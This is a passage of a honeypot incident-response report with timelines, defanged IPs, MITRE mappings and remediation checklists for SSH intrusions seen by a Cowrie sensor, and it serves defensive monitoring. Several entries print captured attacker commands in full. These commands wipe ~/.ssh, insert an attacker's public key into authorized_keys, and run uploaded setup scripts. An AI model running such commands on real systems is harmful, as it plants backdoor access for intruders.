| `2026-09-24 04:32:56` | `cowrie.command.failed` |
| `2026-09-24 04:32:56` | `cowrie.command.input` |
| `2026-09-24 04:32:58` | `cowrie.log.closed` |
| `2026-09-24 04:32:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.251.110[.]209` to AbuseIPDB if not already reported
- [ ] Block `47.251.110[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-feb360ae8f76

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]24` |
| **First Seen** | 2026-09-24 04:35 |
| **Last Seen** | 2026-09-24 04:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 04:35:59` | `cowrie.session.connect` |
| `2026-09-24 04:35:59` | `cowrie.client.version` |
| `2026-09-24 04:35:59` | `cowrie.client.kex` |
| `2026-09-24 04:36:00` | `cowrie.login.success` |
| `2026-09-24 04:36:00` | `cowrie.session.params` |
| `2026-09-24 04:36:00` | `cowrie.command.input` |
| `2026-09-24 04:36:00` | `cowrie.command.failed` |
| `2026-09-24 04:36:00` | `cowrie.log.closed` |
| `2026-09-24 04:36:01` | `cowrie.session.params` |
| `2026-09-24 04:36:01` | `cowrie.command.input` |
| `2026-09-24 04:36:01` | `cowrie.session.file_download` |
| `2026-09-24 04:36:01` | `cowrie.log.closed` |
| `2026-09-24 04:36:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]24` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebe12056ff6d

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]24` |
| **First Seen** | 2026-09-24 04:36 |
| **Last Seen** | 2026-09-24 04:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 04:36:01` | `cowrie.session.connect` |
| `2026-09-24 04:36:01` | `cowrie.client.version` |
| `2026-09-24 04:36:01` | `cowrie.client.kex` |
| `2026-09-24 04:36:02` | `cowrie.login.success` |
| `2026-09-24 04:36:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]24` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7eadbbd03270

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]24` |
| **First Seen** | 2026-09-24 04:36 |
| **Last Seen** | 2026-09-24 04:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 04:36:02` | `cowrie.session.connect` |
| `2026-09-24 04:36:02` | `cowrie.client.version` |
| `2026-09-24 04:36:02` | `cowrie.client.kex` |
| `2026-09-24 04:36:02` | `cowrie.login.success` |
| `2026-09-24 04:36:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]24` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eba23295f58e

| Field | Detail |
|---|---|
| **Source IP** | `45.79.181[.]223` |
| **First Seen** | 2026-09-24 04:38 |
| **Last Seen** | 2026-09-24 04:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 04:38:15` | `cowrie.session.connect` |
| `2026-09-24 04:38:15` | `cowrie.login.success` |
| `2026-09-24 04:38:15` | `cowrie.session.params` |
| `2026-09-24 04:38:15` | `cowrie.command.input` |
| `2026-09-24 04:38:15` | `cowrie.command.input` |
| `2026-09-24 04:38:15` | `cowrie.command.failed` |
| `2026-09-24 04:38:15` | `cowrie.command.input` |
| `2026-09-24 04:38:15` | `cowrie.command.failed` |
| `2026-09-24 04:38:15` | `cowrie.command.input` |
| `2026-09-24 04:38:15` | `cowrie.log.closed` |
| `2026-09-24 04:38:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.181[.]223` to AbuseIPDB if not already reported
- [ ] Block `45.79.181[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc14f65886df

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-24 05:08 |
| **Last Seen** | 2026-09-24 05:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 05:08:05` | `cowrie.session.connect` |
| `2026-09-24 05:08:05` | `cowrie.client.version` |
| `2026-09-24 05:08:05` | `cowrie.client.kex` |
| `2026-09-24 05:08:06` | `cowrie.login.success` |
| `2026-09-24 05:08:08` | `cowrie.direct-tcpip.request` |
| `2026-09-24 05:08:08` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 05:08:08` | `cowrie.direct-tcpip.data` |
| `2026-09-24 05:08:09` | `cowrie.direct-tcpip.request` |
| `2026-09-24 05:08:10` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 05:08:10` | `cowrie.direct-tcpip.data` |
| `2026-09-24 05:08:11` | `cowrie.direct-tcpip.request` |
| `2026-09-24 05:08:11` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 05:08:11` | `cowrie.direct-tcpip.data` |
| `2026-09-24 05:08:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4a1090d1bb1

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-09-24 05:08 |
| **Last Seen** | 2026-09-24 05:09 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 05:08:52` | `cowrie.session.connect` |
| `2026-09-24 05:08:53` | `cowrie.client.version` |
| `2026-09-24 05:08:53` | `cowrie.client.kex` |
| `2026-09-24 05:08:59` | `cowrie.login.success` |
| `2026-09-24 05:09:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0a550853e91

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-09-24 05:09 |
| **Last Seen** | 2026-09-24 05:09 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1h` |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 05:09:03` | `cowrie.session.connect` |
| `2026-09-24 05:09:03` | `cowrie.client.version` |
| `2026-09-24 05:09:03` | `cowrie.client.kex` |
| `2026-09-24 05:09:03` | `cowrie.login.success` |
| `2026-09-24 05:09:36` | `cowrie.session.params` |
| `2026-09-24 05:09:36` | `cowrie.command.input` |
| `2026-09-24 05:09:36` | `cowrie.log.closed` |
| `2026-09-24 05:09:36` | `cowrie.session.file_upload` |
| `2026-09-24 05:09:36` | `cowrie.session.file_upload` |
| `2026-09-24 05:09:36` | `cowrie.session.file_upload` |
| `2026-09-24 05:09:36` | `cowrie.session.file_upload` |
| `2026-09-24 05:09:36` | `cowrie.session.file_upload` |
| `2026-09-24 05:09:36` | `cowrie.session.file_upload` |
| `2026-09-24 05:09:36` | `cowrie.session.file_upload` |
| `2026-09-24 05:09:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e17bb9618558

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-24 05:10 |
| **Last Seen** | 2026-09-24 05:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 05:10:37` | `cowrie.session.connect` |
| `2026-09-24 05:10:37` | `cowrie.client.version` |
| `2026-09-24 05:10:37` | `cowrie.client.kex` |
| `2026-09-24 05:10:38` | `cowrie.login.success` |
| `2026-09-24 05:10:40` | `cowrie.direct-tcpip.request` |
| `2026-09-24 05:10:40` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 05:10:40` | `cowrie.direct-tcpip.data` |
| `2026-09-24 05:10:40` | `cowrie.direct-tcpip.request` |
| `2026-09-24 05:10:41` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 05:10:41` | `cowrie.direct-tcpip.data` |
| `2026-09-24 05:10:43` | `cowrie.direct-tcpip.request` |
| `2026-09-24 05:10:44` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 05:10:44` | `cowrie.direct-tcpip.data` |
| `2026-09-24 05:10:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48d02fe33dbf

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]32` |
| **First Seen** | 2026-09-24 05:16 |
| **Last Seen** | 2026-09-24 05:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 05:16:55` | `cowrie.session.connect` |
| `2026-09-24 05:16:55` | `cowrie.client.version` |
| `2026-09-24 05:16:55` | `cowrie.client.kex` |
| `2026-09-24 05:16:56` | `cowrie.login.success` |
| `2026-09-24 05:16:57` | `cowrie.session.params` |
| `2026-09-24 05:16:57` | `cowrie.command.input` |
| `2026-09-24 05:16:57` | `cowrie.command.failed` |
| `2026-09-24 05:16:57` | `cowrie.log.closed` |
| `2026-09-24 05:16:58` | `cowrie.session.params` |
| `2026-09-24 05:16:58` | `cowrie.command.input` |
| `2026-09-24 05:16:58` | `cowrie.session.file_download` |
| `2026-09-24 05:16:58` | `cowrie.log.closed` |
| `2026-09-24 05:16:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]32` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]32` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c150231be8e3

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]32` |
| **First Seen** | 2026-09-24 05:16 |
| **Last Seen** | 2026-09-24 05:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 05:16:58` | `cowrie.session.connect` |
| `2026-09-24 05:16:58` | `cowrie.client.version` |
| `2026-09-24 05:16:58` | `cowrie.client.kex` |
| `2026-09-24 05:16:58` | `cowrie.login.success` |
| `2026-09-24 05:16:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]32` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]32` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b2c2af20592

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]32` |
| **First Seen** | 2026-09-24 05:16 |
| **Last Seen** | 2026-09-24 05:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 05:16:59` | `cowrie.session.connect` |
| `2026-09-24 05:16:59` | `cowrie.client.version` |
| `2026-09-24 05:16:59` | `cowrie.client.kex` |
| `2026-09-24 05:16:59` | `cowrie.login.success` |
| `2026-09-24 05:16:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]32` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]32` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3df9ce128d3

| Field | Detail |
|---|---|
| **Source IP** | `52.172.177[.]191` |
| **First Seen** | 2026-09-24 05:17 |
| **Last Seen** | 2026-09-24 05:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 05:17:31` | `cowrie.session.connect` |
| `2026-09-24 05:17:31` | `cowrie.client.version` |
| `2026-09-24 05:17:31` | `cowrie.client.kex` |
| `2026-09-24 05:17:32` | `cowrie.login.success` |
| `2026-09-24 05:17:33` | `cowrie.session.params` |
| `2026-09-24 05:17:33` | `cowrie.command.input` |
| `2026-09-24 05:17:33` | `cowrie.command.failed` |
| `2026-09-24 05:17:33` | `cowrie.log.closed` |
| `2026-09-24 05:17:34` | `cowrie.session.params` |
| `2026-09-24 05:17:34` | `cowrie.command.input` |
| `2026-09-24 05:17:35` | `cowrie.session.file_download` |
| `2026-09-24 05:17:35` | `cowrie.log.closed` |
| `2026-09-24 05:17:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.172.177[.]191` to AbuseIPDB if not already reported
- [ ] Block `52.172.177[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ceb0a4b264a8

| Field | Detail |
|---|---|
| **Source IP** | `52.172.177[.]191` |
| **First Seen** | 2026-09-24 05:17 |
| **Last Seen** | 2026-09-24 05:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 05:17:35` | `cowrie.session.connect` |
| `2026-09-24 05:17:35` | `cowrie.client.version` |
| `2026-09-24 05:17:35` | `cowrie.client.kex` |
| `2026-09-24 05:17:36` | `cowrie.login.success` |
| `2026-09-24 05:17:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.172.177[.]191` to AbuseIPDB if not already reported
- [ ] Block `52.172.177[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32f61d87a57f

| Field | Detail |
|---|---|
| **Source IP** | `52.172.177[.]191` |
| **First Seen** | 2026-09-24 05:17 |
| **Last Seen** | 2026-09-24 05:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 05:17:36` | `cowrie.session.connect` |
| `2026-09-24 05:17:36` | `cowrie.client.version` |
| `2026-09-24 05:17:36` | `cowrie.client.kex` |
| `2026-09-24 05:17:37` | `cowrie.login.success` |
| `2026-09-24 05:17:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.172.177[.]191` to AbuseIPDB if not already reported
- [ ] Block `52.172.177[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1162b73cec32

| Field | Detail |
|---|---|
| **Source IP** | `115.79.192[.]73` |
| **First Seen** | 2026-09-24 05:18 |
| **Last Seen** | 2026-09-24 05:19 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 05:18:52` | `cowrie.session.connect` |
| `2026-09-24 05:18:52` | `cowrie.client.version` |
| `2026-09-24 05:18:52` | `cowrie.client.kex` |
| `2026-09-24 05:18:53` | `cowrie.login.success` |
| `2026-09-24 05:18:54` | `cowrie.session.params` |
| `2026-09-24 05:18:54` | `cowrie.command.input` |
| `2026-09-24 05:18:54` | `cowrie.command.failed` |
| `2026-09-24 05:18:55` | `cowrie.log.closed` |
| `2026-09-24 05:18:56` | `cowrie.session.params` |
| `2026-09-24 05:18:56` | `cowrie.command.input` |
| `2026-09-24 05:18:57` | `cowrie.session.file_download` |
| `2026-09-24 05:18:57` | `cowrie.log.closed` |
| `2026-09-24 05:19:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.79.192[.]73` to AbuseIPDB if not already reported
- [ ] Block `115.79.192[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3b3c65b724b

| Field | Detail |
|---|---|
| **Source IP** | `116.71.136[.]125` |
| **First Seen** | 2026-09-24 05:18 |
| **Last Seen** | 2026-09-24 05:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 05:18:52` | `cowrie.session.connect` |
| `2026-09-24 05:18:52` | `cowrie.client.version` |
| `2026-09-24 05:18:53` | `cowrie.client.kex` |
| `2026-09-24 05:18:54` | `cowrie.login.success` |
| `2026-09-24 05:18:55` | `cowrie.session.params` |
| `2026-09-24 05:18:55` | `cowrie.command.input` |
| `2026-09-24 05:18:55` | `cowrie.command.failed` |
| `2026-09-24 05:18:56` | `cowrie.log.closed` |
| `2026-09-24 05:18:57` | `cowrie.session.params` |
| `2026-09-24 05:18:57` | `cowrie.command.input` |
| `2026-09-24 05:18:57` | `cowrie.session.file_download` |
| `2026-09-24 05:18:57` | `cowrie.log.closed` |
| `2026-09-24 05:19:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.71.136[.]125` to AbuseIPDB if not already reported
- [ ] Block `116.71.136[.]125` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0aadfe6a516b

| Field | Detail |
|---|---|
| **Source IP** | `180.180.242[.]201` |
| **First Seen** | 2026-09-24 05:18 |
| **Last Seen** | 2026-09-24 05:19 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 05:18:53` | `cowrie.session.connect` |
| `2026-09-24 05:18:53` | `cowrie.client.version` |
| `2026-09-24 05:18:53` | `cowrie.client.kex` |
| `2026-09-24 05:18:56` | `cowrie.login.success` |
| `2026-09-24 05:18:58` | `cowrie.session.params` |
| `2026-09-24 05:18:58` | `cowrie.command.input` |
| `2026-09-24 05:18:58` | `cowrie.command.failed` |
| `2026-09-24 05:18:58` | `cowrie.log.closed` |
| `2026-09-24 05:18:59` | `cowrie.session.params` |
| `2026-09-24 05:18:59` | `cowrie.command.input` |
| `2026-09-24 05:18:59` | `cowrie.session.file_download` |
| `2026-09-24 05:18:59` | `cowrie.log.closed` |
| `2026-09-24 05:19:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.180.242[.]201` to AbuseIPDB if not already reported
- [ ] Block `180.180.242[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bfc3e5039a8

| Field | Detail |
|---|---|
| **Source IP** | `115.79.192[.]73` |
| **First Seen** | 2026-09-24 05:18 |
| **Last Seen** | 2026-09-24 05:18 |
| **Session Duration** | 2s |
